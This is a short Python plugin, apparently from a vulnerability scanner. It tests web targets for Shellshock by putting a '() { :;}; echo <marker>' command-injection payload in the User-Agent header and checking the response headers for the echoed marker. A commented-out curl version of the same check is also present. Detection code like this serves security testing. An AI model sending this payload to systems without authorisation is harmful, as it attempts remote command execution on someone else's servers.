#!/usr/bin/env python
# coding=utf-8


# from port_cracker.plugin_scan.dummy import *
from config import *
from lib.common import *


def verify(task):
    message = {
        "method": "",
        "url" : "",
        "param" : "",
        "type" : "shell-shock",
        "info" : "[shell shock]",
    }

    url = task['url']
    headers = task['request_header']
    method = task['method']
    data = task['request_content'] if method == 'POST' else None
    # url =  'http://%s:%s/' % (ip, port)
    payload = '''() { :;}; echo 1a8b8e54b53f63a4efae84e064373f12:'''
    headers['User-Agent'] = payload

    hj = THTTPJOB(url, method=method, headers=headers, data=data)
    status, headers, content, time_check = hj.request()
    if status == 200 and '1a8b8e54b53f63a4efae84e064373f12' in str(headers):
        message['url'] = url
        message['method'] = method
        message['param'] = payload
        save_to_databases(message)
        # logger.info('[found] {}'.format(message))
        return True, message

    return (False, {})
    # code, head, res, errcode, _ = curl.curl('-A "%s" %s' % (payload, url))
    # if '1a8b8e54b53f63a4efae84e064373f12' in head:
    #     ret = {
    #         'algroup': 'ShellShock Remote Code Execution',
    #         'affects':  url,
    #         'details': "Shell Shock: curl -A '%s' %s" % (payload, url) +
    #                    ' \n\nFound header [1a8b8e54b53f63a4efae84e064373f12]'
    #     }
    #     return ret

